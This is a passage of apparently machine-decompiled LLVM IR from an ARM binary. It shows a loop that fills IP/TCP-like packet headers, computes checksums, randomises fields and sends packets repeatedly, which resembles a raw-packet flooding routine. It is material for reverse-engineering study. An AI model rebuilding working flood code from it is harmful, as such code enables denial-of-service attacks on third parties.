  %v4_c374 = inttoptr i32 %v3_c374 to i8*
  store i8 %v1_c374, i8* %v4_c374, align 1
  %v0_c378 = load i32, i32* %r2.global-to-local, align 4
  %v1_c378 = load i32, i32* @r7, align 4
  %v2_c378 = add i32 %v1_c378, 16
  %v3_c378 = inttoptr i32 %v2_c378 to i32*
  store i32 %v0_c378, i32* %v3_c378, align 4
  %v0_c37c = load i32, i32* @sl, align 4
  %v1_c37c = trunc i32 %v0_c37c to i8
  %v2_c37c = load i32, i32* @r7, align 4
  %v3_c37c = add i32 %v2_c37c, 20
  %v4_c37c = inttoptr i32 %v3_c37c to i8*
  store i8 %v1_c37c, i8* %v4_c37c, align 1
  %v0_c380 = load i32, i32* @r7, align 4
  %v1_c380 = add i32 %v0_c380, 20
  store i32 %v1_c380, i32* @r4, align 4
  %v1_c384 = add i32 %v0_c380, 33
  %v2_c384 = inttoptr i32 %v1_c384 to i8*
  %v3_c384 = load i8, i8* %v2_c384, align 1
  %v4_c384 = zext i8 %v3_c384 to i32
  store i32 %v1_c254, i32* %r1.global-to-local, align 4
  %v1_c38c = and i32 %v4_c384, 223
  %v5_c390 = or i32 %v1_c38c, %v4_c390
  store i32 %v5_c390, i32* %r3.global-to-local, align 4
  %v1_c394 = trunc i32 %v5_c390 to i8
  store i8 %v1_c394, i8* %v2_c384, align 1
  %v0_c398 = load i32, i32* @r4, align 4
  %v1_c398 = add i32 %v0_c398, 13
  %v2_c398 = inttoptr i32 %v1_c398 to i8*
  %v3_c398 = load i8, i8* %v2_c398, align 1
  %v4_c398 = zext i8 %v3_c398 to i32
  store i32 %v1_c258, i32* %r3.global-to-local, align 4
  %v1_c3a0 = and i32 %v4_c398, 239
  %v5_c3a4 = or i32 %v1_c3a0, %v4_c3a4
  store i32 %v5_c3a4, i32* %r2.global-to-local, align 4
  %v1_c3a8 = trunc i32 %v5_c3a4 to i8
  store i8 %v1_c3a8, i8* %v2_c398, align 1
  %v0_c3ac = load i32, i32* @r4, align 4
  %v1_c3ac = add i32 %v0_c3ac, 13
  %v2_c3ac = inttoptr i32 %v1_c3ac to i8*
  %v3_c3ac = load i8, i8* %v2_c3ac, align 1
  %v4_c3ac = zext i8 %v3_c3ac to i32
  store i32 %v1_c25c, i32* %ip.global-to-local, align 4
  %v1_c3b4 = and i32 %v4_c3ac, 247
  %v5_c3b8 = or i32 %v1_c3b4, %v4_c3b8
  store i32 %v5_c3b8, i32* %r3.global-to-local, align 4
  %v1_c3bc = trunc i32 %v5_c3b8 to i8
  store i8 %v1_c3bc, i8* %v2_c3ac, align 1
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v1_c3c0 = add i32 %v0_c3c0, 13
  %v2_c3c0 = inttoptr i32 %v1_c3c0 to i8*
  %v3_c3c0 = load i8, i8* %v2_c3c0, align 1
  %v4_c3c0 = zext i8 %v3_c3c0 to i32
  store i32 %v1_c280, i32* %r1.global-to-local, align 4
  %v1_c3c8 = and i32 %v4_c3c0, 251
  %v5_c3cc = or i32 %v1_c3c8, %v4_c3cc
  store i32 %v5_c3cc, i32* %r2.global-to-local, align 4
  %v1_c3d0 = trunc i32 %v5_c3cc to i8
  store i8 %v1_c3d0, i8* %v2_c3c0, align 1
  %v0_c3d4 = load i32, i32* @r4, align 4
  %v1_c3d4 = add i32 %v0_c3d4, 13
  %v2_c3d4 = inttoptr i32 %v1_c3d4 to i8*
  %v3_c3d4 = load i8, i8* %v2_c3d4, align 1
  %v4_c3d4 = zext i8 %v3_c3d4 to i32
  store i32 %v1_c284, i32* %r2.global-to-local, align 4
  %v1_c3dc = and i32 %v4_c3d4, 253
  %v4_c3e0 = or i32 %v1_c3dc, %v3_c3e0
  store i32 %v4_c3e0, i32* %r3.global-to-local, align 4
  %v1_c3e4 = trunc i32 %v4_c3e0 to i8
  store i8 %v1_c3e4, i8* %v2_c3d4, align 1
  %v0_c3e8 = load i32, i32* @r4, align 4
  %v1_c3e8 = add i32 %v0_c3e8, 12
  %v2_c3e8 = inttoptr i32 %v1_c3e8 to i8*
  %v3_c3e8 = load i8, i8* %v2_c3e8, align 1
  %v4_c3e8 = zext i8 %v3_c3e8 to i32
  store i32 %v4_c3e8, i32* %r2.global-to-local, align 4
  %v1_c3ec = add i32 %v0_c3e8, 13
  %v2_c3ec = inttoptr i32 %v1_c3ec to i8*
  %v3_c3ec = load i8, i8* %v2_c3ec, align 1
  %v4_c3ec = zext i8 %v3_c3ec to i32
  store i32 %v1_c288, i32* %ip.global-to-local, align 4
  %tmp99 = urem i8 %v3_c3e8, 16
  %v1_c3f4 = zext i8 %tmp99 to i32
  %v1_c3f8 = and i32 %v4_c3ec, 254
  %v2_c3fc = or i32 %v1_c3f8, %v1_c288
  store i32 %v2_c3fc, i32* %r3.global-to-local, align 4
  %v1_c400 = or i32 %v1_c3f4, 80
  store i32 %v1_c400, i32* %r2.global-to-local, align 4
  %v1_c404 = trunc i32 %v2_c3fc to i8
  store i8 %v1_c404, i8* %v2_c3ec, align 1
  %v0_c408 = load i32, i32* %r2.global-to-local, align 4
  %v1_c408 = trunc i32 %v0_c408 to i8
  %v2_c408 = load i32, i32* @r4, align 4
  %v3_c408 = add i32 %v2_c408, 12
  %v4_c408 = inttoptr i32 %v3_c408 to i8*
  store i8 %v1_c408, i8* %v4_c408, align 1
  store i32 %v3_c410, i32* %r1.global-to-local, align 4
  store i32 %v7_c410, i32* %r2.global-to-local, align 4
  %v2_c414 = load i32, i32* @r4, align 4
  %v3_c414 = add i32 %v2_c414, 1
  %v4_c414 = inttoptr i32 %v3_c414 to i8*
  store i8 %v5_c2c0, i8* %v4_c414, align 1
  %v0_c418 = load i32, i32* %r2.global-to-local, align 4
  %v1_c418 = trunc i32 %v0_c418 to i8
  %v2_c418 = load i32, i32* @r4, align 4
  %v3_c418 = add i32 %v2_c418, 3
  %v4_c418 = inttoptr i32 %v3_c418 to i8*
  store i8 %v1_c418, i8* %v4_c418, align 1
  %v0_c41c = load i32, i32* @r6, align 4
  %v1_c41c = trunc i32 %v0_c41c to i8
  %v2_c41c = load i32, i32* @r4, align 4
  %v3_c41c = add i32 %v2_c41c, 2
  %v4_c41c = inttoptr i32 %v3_c41c to i8*
  store i8 %v1_c41c, i8* %v4_c41c, align 1
  %v0_c420 = load i32, i32* @r8, align 4
  %v1_c420 = load i32, i32* @r4, align 4
  %v2_c420 = add i32 %v1_c420, 4
  %v3_c420 = inttoptr i32 %v2_c420 to i32*
  store i32 %v0_c420, i32* %v3_c420, align 4
  %v0_c424 = call i32 @function_fe60()
  store i32 %v1_c28c, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_c424, 16777216
  %v1_c42c = sdiv i32 %sext, 16777216
  store i32 %v1_c42c, i32* %r2.global-to-local, align 4
  %v3_c430 = ashr i32 %sext, 31
  store i32 %v3_c430, i32* %r3.global-to-local, align 4
  store i1 %v2_c434, i1* %cpsr_z.global-to-local, align 1
  %v1_c438 = trunc i32 %v3_c430 to i8
  %v2_c438 = load i32, i32* @r4, align 4
  %v3_c438 = add i32 %v2_c438, 15
  %v4_c438 = inttoptr i32 %v3_c438 to i8*
  store i8 %v1_c438, i8* %v4_c438, align 1
  %v0_c43c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_c448.pre = load i32, i32* @r4, align 4
  br i1 %v0_c43c, label %.thread13, label %bb87

bb87:                                             ; preds = %bb86
  %v2_c43c = add i32 %v2_c448.pre, 13
  %v3_c43c = inttoptr i32 %v2_c43c to i8*
  %v4_c43c = load i8, i8* %v3_c43c, align 1
  %v5_c43c = zext i8 %v4_c43c to i32
  %v2_c440 = or i32 %v5_c43c, 8
  store i32 %v2_c440, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb86, %bb87
  store i32 %v6_c13c, i32* @r1, align 4
  %v0_c448 = load i32, i32* %r2.global-to-local, align 4
  %v1_c448 = trunc i32 %v0_c448 to i8
  %v3_c448 = add i32 %v2_c448.pre, 14
  %v4_c448 = inttoptr i32 %v3_c448 to i8*
  store i8 %v1_c448, i8* %v4_c448, align 1
  %v0_c44c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c44c, label %bb89, label %bb88

bb88:                                             ; preds = %.thread13
  %v1_c44c = load i32, i32* %r3.global-to-local, align 4
  %v2_c44c = trunc i32 %v1_c44c to i8
  %v3_c44c = load i32, i32* @r4, align 4
  %v4_c44c = add i32 %v3_c44c, 13
  %v5_c44c = inttoptr i32 %v4_c44c to i8*
  store i8 %v2_c44c, i8* %v5_c44c, align 1
  br label %bb89

bb89:                                             ; preds = %.thread13, %bb88
  %v0_c450 = load i32, i32* @r7, align 4
  %v1_c450 = add i32 %v0_c450, 40
  %v1_c454 = inttoptr i32 %v1_c450 to i8*
  %v2_c454 = call i32 @function_1003c(i8* %v1_c454)
  %v3_c458 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c458, i32* %r3.global-to-local, align 4
  %v1_c45c = add i32 %v3_c458, 1
  store i32 %v1_c45c, i32* @r4, align 4
  %v0_c460 = load i32, i32* @fp, align 4
  %v9_c460 = icmp eq i32 %v0_c460, %v1_c45c
  store i1 %v9_c460, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c45c, i32* %stack_var_-40, align 4
  %v8_c468 = icmp sgt i32 %v0_c460, %v1_c45c
  br i1 %v8_c468, label %dec_label_pc_c2cc, label %dec_label_pc_c46c

dec_label_pc_c46c:                                ; preds = %bb89
  store i32 %v6_c13c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c474.preheader

dec_label_pc_c474.preheader:                      ; preds = %dec_label_pc_c46c, %dec_label_pc_c6e0
  %v0_c47417 = phi i32 [ %v0_c460, %dec_label_pc_c46c ], [ %v0_c1e0, %dec_label_pc_c6e0 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_c200, %dec_label_pc_c46c ], [ %v1_c6e8, %dec_label_pc_c6e0 ]
  %storemerge = add i32 %v6_c13c, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_c62c = icmp eq i32 %v6_c178, -1
  %v8_c62c = icmp eq i32 %v6_c178, -1
  %v3_c648 = icmp eq i32 %v3_c1d4, 65535
  %v2_c6c4 = icmp eq i32 %v1_c164, 0
  br label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c474.preheader
  %v0_c474 = phi i32 [ %v0_c47417, %dec_label_pc_c474.preheader ], [ %v0_c5b0, %dec_label_pc_c51c ]
  %v2_c474 = icmp eq i32 %v0_c474, 0
  store i1 %v2_c474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp90 = icmp slt i32 %v0_c474, 1
  br label %dec_label_pc_c47c

dec_label_pc_c47c:                                ; preds = %dec_label_pc_c47c, %dec_label_pc_c474
  br i1 %tmp90, label %dec_label_pc_c47c, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %dec_label_pc_c47c
  %v0_c480 = load i32, i32* @r8, align 4
  %v3_c480 = mul i32 %v0_c480, 65536
  store i32 %v3_c480, i32* %r2.global-to-local, align 4
  %tmp91 = mul i32 %v0_c480, 256
  %v1_c488 = and i32 %tmp91, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_c488, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp92 = udiv i32 %v0_c480, 256
  %v4_c494 = urem i32 %tmp92, 256
  %v5_c494 = or i32 %v4_c494, %v1_c488
  store i32 %v5_c494, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_c49c

dec_label_pc_c49c:                                ; preds = %dec_label_pc_c51c, %dec_label_pc_c480
  %v1_c4b0 = phi i32 [ %v1_c5ac, %dec_label_pc_c51c ], [ 0, %dec_label_pc_c480 ]
  %v5_c4a0 = mul i32 %v1_c4b0, 24
  %v1_c4a4 = load i32, i32* @sb, align 4
  %v2_c4a4 = add i32 %v1_c4a4, %v5_c4a0
  store i32 %v2_c4a4, i32* %r3.global-to-local, align 4
  store i32 %v2_bfa8, i32* %ip.global-to-local, align 4
  %v1_c4ac = add i32 %v2_c4a4, 20
  %v2_c4ac = inttoptr i32 %v1_c4ac to i8*
  %v3_c4ac = load i8, i8* %v2_c4ac, align 1
  %v4_c4ac = zext i8 %v3_c4ac to i32
  store i32 %v4_c4ac, i32* %r2.global-to-local, align 4
  %v4_c4b0 = mul i32 %v1_c4b0, 4
  %v5_c4b0 = add i32 %v4_c4b0, %v2_bfa8
  %v6_c4b0 = inttoptr i32 %v5_c4b0 to i32*
  %v7_c4b0 = load i32, i32* %v6_c4b0, align 4
  store i32 %v7_c4b0, i32* @r5, align 4
  %v7_c4b4 = icmp eq i8 %v3_c4ac, 31
  store i1 %v7_c4b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c4b8 = add i32 %v7_c4b0, 20
  store i32 %v1_c4b8, i32* @r6, align 4
  %tmp100 = icmp ult i8 %v3_c4ac, 32
  br i1 %tmp100, label %dec_label_pc_c5d0, label %dec_label_pc_c4c0

dec_label_pc_c4c0:                                ; preds = %dec_label_pc_c49c
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c648, label %dec_label_pc_c654, label %dec_label_pc_c4e0

dec_label_pc_c4e0:                                ; preds = %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge, %dec_label_pc_c4cc
  %v1_c4e4 = phi i32 [ %v1_c4e4.pre, %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge ], [ 65535, %dec_label_pc_c4cc ]
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v9_c4e4 = icmp eq i32 %v3_c1d8, %v1_c4e4
  store i1 %v9_c4e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4e4, label %dec_label_pc_c670, label %dec_label_pc_c4ec

dec_label_pc_c4ec:                                ; preds = %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge, %dec_label_pc_c4e0
  %v1_c4f0 = phi i32 [ %v1_c4f0.pre, %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge ], [ %v1_c4e4, %dec_label_pc_c4e0 ]
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v9_c4f0 = icmp eq i32 %v3_c1dc, %v1_c4f0
  store i1 %v9_c4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4f0, label %dec_label_pc_c68c, label %dec_label_pc_c4f8

dec_label_pc_c4f8:                                ; preds = %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge, %dec_label_pc_c4ec
  %v1_c4fc = phi i32 [ %v1_c4fc.pre, %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge ], [ %v1_c4f0, %dec_label_pc_c4ec ]
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v9_c4fc = icmp eq i32 %v5_c078, %v1_c4fc
  store i1 %v9_c4fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c4fc, label %dec_label_pc_c6a8, label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c68c.dec_label_pc_c504_crit_edge, %dec_label_pc_c4f8
  %v1_c508 = phi i32 [ %v1_c508.pre, %dec_label_pc_c68c.dec_label_pc_c504_crit_edge ], [ %v1_c4fc, %dec_label_pc_c4f8 ]
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
  %v9_c508 = icmp eq i32 %v6_c094, %v1_c508
  store i1 %v9_c508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c508, label %dec_label_pc_c6bc, label %dec_label_pc_c510

dec_label_pc_c510:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c504
  store i32 %v1_c164, i32* %r3.global-to-local, align 4
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6c4, label %dec_label_pc_c51c, label %dec_label_pc_c6d0

dec_label_pc_c51c:                                ; preds = %dec_label_pc_c510, %dec_label_pc_c6bc, %dec_label_pc_c6d0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c520 = load i32, i32* @r7, align 4
  %v1_c520 = trunc i32 %v0_c520 to i8
  %v2_c520 = load i32, i32* @r5, align 4
  %v3_c520 = add i32 %v2_c520, 10
  %v4_c520 = inttoptr i32 %v3_c520 to i8*
  store i8 %v1_c520, i8* %v4_c520, align 1
  %v0_c524 = load i32, i32* @r7, align 4
  %v1_c524 = trunc i32 %v0_c524 to i8
  %v2_c524 = load i32, i32* @r5, align 4
  %v3_c524 = add i32 %v2_c524, 11
  %v4_c524 = inttoptr i32 %v3_c524 to i8*
  store i8 %v1_c524, i8* %v4_c524, align 1
  %v0_c528 = load i32, i32* @r5, align 4
  store i32 %v0_c528, i32* @r0, align 4
  %v2_c52c = call i32 @function_e424(i32 %v0_c528, i32 20)
  %v3_c52c = trunc i32 %v2_c52c to i8
  %v4_c53028 = udiv i32 %v2_c52c, 256
  %v1_c534 = trunc i32 %v4_c53028 to i8
  %v2_c534 = load i32, i32* @r5, align 4
  %v3_c534 = add i32 %v2_c534, 11
  %v4_c534 = inttoptr i32 %v3_c534 to i8*
  store i8 %v1_c534, i8* %v4_c534, align 1
  %v3_c538 = load i32, i32* @r5, align 4
  %v4_c538 = add i32 %v3_c538, 10
  %v5_c538 = inttoptr i32 %v4_c538 to i8*
  store i8 %v3_c52c, i8* %v5_c538, align 1
  %v0_c53c = load i32, i32* @r6, align 4
  store i32 %v0_c53c, i32* @r1, align 4
  %v0_c540 = load i32, i32* @sl, align 4
  store i32 %v0_c540, i32* %r2.global-to-local, align 4
  %v0_c544 = load i32, i32* @r8, align 4
  store i32 %v0_c544, i32* %r3.global-to-local, align 4
  %v0_c548 = load i32, i32* @r7, align 4
  %v1_c548 = trunc i32 %v0_c548 to i8
  %v3_c548 = add i32 %v0_c53c, 16
  %v4_c548 = inttoptr i32 %v3_c548 to i8*
  store i8 %v1_c548, i8* %v4_c548, align 1
  %v0_c54c = load i32, i32* @r7, align 4
  %v1_c54c = trunc i32 %v0_c54c to i8
  %v2_c54c = load i32, i32* @r6, align 4
  %v3_c54c = add i32 %v2_c54c, 17
  %v4_c54c = inttoptr i32 %v3_c54c to i8*
  store i8 %v1_c54c, i8* %v4_c54c, align 1
  %v0_c550 = load i32, i32* @r5, align 4
  %v4_c554 = call i32 @function_e480(i32 %v0_c550, i32 %v0_c53c, i32 %v0_c540, i32 %v0_c544)
  %v5_c554 = trunc i32 %v4_c554 to i8
  %v4_c55829 = udiv i32 %v4_c554, 256
  %v1_c55c = trunc i32 %v4_c55829 to i8
  %v2_c55c = load i32, i32* @r6, align 4
  %v3_c55c = add i32 %v2_c55c, 17
  %v4_c55c = inttoptr i32 %v3_c55c to i8*
  store i8 %v1_c55c, i8* %v4_c55c, align 1
  %v3_c560 = load i32, i32* @r6, align 4
  %v4_c560 = add i32 %v3_c560, 16
  %v5_c560 = inttoptr i32 %v4_c560 to i8*
  store i8 %v5_c554, i8* %v5_c560, align 1
  %v3_c564 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c564, i32* %r3.global-to-local, align 4
  %v0_c568 = load i32, i32* @r5, align 4
  %v1_c568 = add i32 %v0_c568, 20
  %v2_c568 = inttoptr i32 %v1_c568 to i32*
  %v3_c568 = load i32, i32* %v2_c568, align 4
  %v3_c570 = udiv i32 %v3_c568, 65536
  store i32 %v3_c570, i32* %r2.global-to-local, align 4
  %v5_c574 = mul i32 %v3_c564, 24
  %v1_c578 = load i32, i32* @sb, align 4
  %v2_c578 = add i32 %v1_c578, %v5_c574
  store i32 %v2_c578, i32* %ip.global-to-local, align 4
  %v3_c57c27 = udiv i32 %v3_c568, 16777216
  %v1_c580 = trunc i32 %v3_c57c27 to i8
  %v3_c580 = add i32 %v2_c578, 3
  %v4_c580 = inttoptr i32 %v3_c580 to i8*
  store i8 %v1_c580, i8* %v4_c580, align 1
  %v0_c584 = load i32, i32* %r2.global-to-local, align 4
  %v1_c584 = trunc i32 %v0_c584 to i8
  %v2_c584 = load i32, i32* %ip.global-to-local, align 4
  %v3_c584 = add i32 %v2_c584, 2
  %v4_c584 = inttoptr i32 %v3_c584 to i8*
  store i8 %v1_c584, i8* %v4_c584, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  store i32 %v0_c58c, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c59c = load i32, i32* %ip.global-to-local, align 4
  %v6_c5a4 = inttoptr i32 %v0_c58c to i32*
  %v7_c5a4 = call i32 @function_13eec(i32 %v3_c18c, i32* %v6_c5a4, i32 %stack_var_-168.0.ph, i32 16384, i32 %v0_c59c, i32 16)
  %v3_c5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c5a8, i32* %r3.global-to-local, align 4
  %v1_c5ac = add i32 %v3_c5a8, 1
  %v0_c5b0 = load i32, i32* @fp, align 4
  %v9_c5b0 = icmp eq i32 %v0_c5b0, %v1_c5ac
  store i1 %v9_c5b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c5ac, i32* %stack_var_-40, align 4
  %v7_c5b8 = icmp sgt i32 %v0_c5b0, %v1_c5ac
  br i1 %v7_c5b8, label %dec_label_pc_c49c, label %dec_label_pc_c474

dec_label_pc_c5c0:                                ; preds = %dec_label_pc_c19c
  %v1_c5c4 = call i32 @function_13654(i32 %v3_c18c)
  br label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_bf88, %dec_label_pc_c5c0
  %v29_c5cc = phi i32 [ %v3_c18c, %dec_label_pc_bf88 ], [ %v1_c5c4, %dec_label_pc_c5c0 ]
  ret i32 %v29_c5cc

dec_label_pc_c5d0:                                ; preds = %dec_label_pc_c49c
  %v1_c5d0 = add i32 %v2_c4a4, 16
  %v2_c5d0 = inttoptr i32 %v1_c5d0 to i32*
  %v3_c5d0 = load i32, i32* %v2_c5d0, align 4
  %v0_c5d4 = call i32 @function_fe60()
  %v3_c5d8 = load i32, i32* %stack_var_-40, align 4
  %v5_c5e0 = mul i32 %v3_c5d8, 24
  %v1_c5e8 = load i32, i32* @sb, align 4
  %v2_c5e8 = add i32 %v1_c5e8, %v5_c5e0
  store i32 %v2_c5e8, i32* %r1.global-to-local, align 4
  %v1_c5ec = and i32 %v3_c5d0, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_c5ec, i32* %r3.global-to-local, align 4
  %v1_c5e4 = udiv i32 %v3_c5d0, 256
  %v3_c5f0 = and i32 %v1_c5e4, 65280
  store i32 %v3_c5f0, i32* %r2.global-to-local, align 4
  %v3_c5f4 = mul i32 %v3_c5d0, 16777216
  store i32 %v3_c5f4, i32* %ip.global-to-local, align 4
  %v1_c5f8 = add i32 %v2_c5e8, 20
  %v2_c5f8 = inttoptr i32 %v1_c5f8 to i8*
  %v3_c5f8 = load i8, i8* %v2_c5f8, align 1
  %v4_c5f8 = zext i8 %v3_c5f8 to i32
  %v4_c5fc = mul i32 %v1_c5ec, 256
  %v5_c5fc = or i32 %v4_c5fc, %v3_c5f4
  store i32 %v5_c5fc, i32* %ip.global-to-local, align 4
  %v4_c600 = udiv i32 %v3_c5d0, 16777216
  %v5_c600 = or i32 %v3_c5f0, %v4_c600
  %v2_c604 = or i32 %v5_c600, %v5_c5fc
  %v7_c608 = lshr i32 %v0_c5d4, %v4_c5f8
  %v8_c608 = add i32 %v7_c608, %v2_c604
  store i32 %v8_c608, i32* %r2.global-to-local, align 4
  %v2_c624 = call i32 @llvm.bswap.i32(i32 %v8_c608)
  store i32 %v2_c624, i32* %r3.global-to-local, align 4
  store i32 %v6_c178, i32* %r1.global-to-local, align 4
  store i1 %v8_c62c, i1* %cpsr_z.global-to-local, align 1
  %v1_c630 = load i32, i32* @r5, align 4
  %v2_c630 = add i32 %v1_c630, 16
  %v3_c630 = inttoptr i32 %v2_c630 to i32*
  store i32 %v2_c624, i32* %v3_c630, align 4
  br i1 %v3_c62c, label %dec_label_pc_c638, label %dec_label_pc_c4cc

dec_label_pc_c638:                                ; preds = %dec_label_pc_c5d0, %dec_label_pc_c4c0
  %v0_c638 = call i32 @function_fe60()
  store i32 %v3_c1d4, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c648, i1* %cpsr_z.global-to-local, align 1
  %v1_c64c = load i32, i32* @r5, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v0_c638, i32* %v3_c64c, align 4
  br i1 %v3_c648, label %dec_label_pc_c654, label %dec_label_pc_c638.dec_label_pc_c4e0_crit_edge

dec_label_pc_c638.dec_label_pc_c4e0_crit_edge:    ; preds = %dec_label_pc_c638
  %v1_c4e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4e0

dec_label_pc_c654:                                ; preds = %dec_label_pc_c638, %dec_label_pc_c4cc
  %v0_c654 = call i32 @function_fe60()
  %v1_c654 = trunc i32 %v0_c654 to i8
  %v4_c65830 = udiv i32 %v0_c654, 256
  %v1_c65c = trunc i32 %v4_c65830 to i8
  %v2_c65c = load i32, i32* @r5, align 4
  %v3_c65c = add i32 %v2_c65c, 5
  %v4_c65c = inttoptr i32 %v3_c65c to i8*
  store i8 %v1_c65c, i8* %v4_c65c, align 1
  store i32 %v3_c1d8, i32* %r3.global-to-local, align 4
  %v1_c664 = load i32, i32* @r4, align 4
  %v9_c664 = icmp eq i32 %v3_c1d8, %v1_c664
  store i1 %v9_c664, i1* %cpsr_z.global-to-local, align 1
  %v3_c668 = load i32, i32* @r5, align 4
  %v4_c668 = add i32 %v3_c668, 4
  %v5_c668 = inttoptr i32 %v4_c668 to i8*
  store i8 %v1_c654, i8* %v5_c668, align 1
  %v0_c66c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c66c, label %dec_label_pc_c670, label %dec_label_pc_c654.dec_label_pc_c4ec_crit_edge

dec_label_pc_c654.dec_label_pc_c4ec_crit_edge:    ; preds = %dec_label_pc_c654
  %v1_c4f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4ec

dec_label_pc_c670:                                ; preds = %dec_label_pc_c654, %dec_label_pc_c4e0
  %v0_c670 = call i32 @function_fe60()
  %v1_c670 = trunc i32 %v0_c670 to i8
  store i32 %v3_c1dc, i32* %ip.global-to-local, align 4
  %v4_c678 = sdiv i32 %v0_c670, 256
  store i32 %v4_c678, i32* %r3.global-to-local, align 4
  %v1_c67c = load i32, i32* @r4, align 4
  %v9_c67c = icmp eq i32 %v3_c1dc, %v1_c67c
  store i1 %v9_c67c, i1* %cpsr_z.global-to-local, align 1
  %v3_c680 = load i32, i32* @r5, align 4
  %v4_c680 = add i32 %v3_c680, 20
  %v5_c680 = inttoptr i32 %v4_c680 to i8*
  store i8 %v1_c670, i8* %v5_c680, align 1
  %v0_c684 = load i32, i32* %r3.global-to-local, align 4
  %v1_c684 = trunc i32 %v0_c684 to i8
  %v2_c684 = load i32, i32* @r6, align 4
  %v3_c684 = add i32 %v2_c684, 1
  %v4_c684 = inttoptr i32 %v3_c684 to i8*
  store i8 %v1_c684, i8* %v4_c684, align 1
  %v0_c688 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c688, label %dec_label_pc_c68c, label %dec_label_pc_c670.dec_label_pc_c4f8_crit_edge

dec_label_pc_c670.dec_label_pc_c4f8_crit_edge:    ; preds = %dec_label_pc_c670
  %v1_c4fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c4f8

dec_label_pc_c68c:                                ; preds = %dec_label_pc_c670, %dec_label_pc_c4ec
  %v0_c68c = call i32 @function_fe60()
  %v1_c68c = trunc i32 %v0_c68c to i8
  store i32 %v5_c078, i32* %r1.global-to-local, align 4
  %v4_c694 = sdiv i32 %v0_c68c, 256
  store i32 %v4_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = load i32, i32* @r4, align 4
  %v9_c698 = icmp eq i32 %v5_c078, %v1_c698
  store i1 %v9_c698, i1* %cpsr_z.global-to-local, align 1
  %v1_c69c = trunc i32 %v4_c694 to i8
  %v2_c69c = load i32, i32* @r6, align 4
  %v3_c69c = add i32 %v2_c69c, 3
  %v4_c69c = inttoptr i32 %v3_c69c to i8*
  store i8 %v1_c69c, i8* %v4_c69c, align 1
  %v3_c6a0 = load i32, i32* @r6, align 4
  %v4_c6a0 = add i32 %v3_c6a0, 2
  %v5_c6a0 = inttoptr i32 %v4_c6a0 to i8*
  store i8 %v1_c68c, i8* %v5_c6a0, align 1
  %v0_c6a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6a4, label %dec_label_pc_c6a8, label %dec_label_pc_c68c.dec_label_pc_c504_crit_edge

dec_label_pc_c68c.dec_label_pc_c504_crit_edge:    ; preds = %dec_label_pc_c68c
  %v1_c508.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c504

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c68c, %dec_label_pc_c4f8
  %v0_c6a8 = call i32 @function_fe60()
  store i32 %v6_c094, i32* %r2.global-to-local, align 4
  %v1_c6b0 = load i32, i32* @r4, align 4
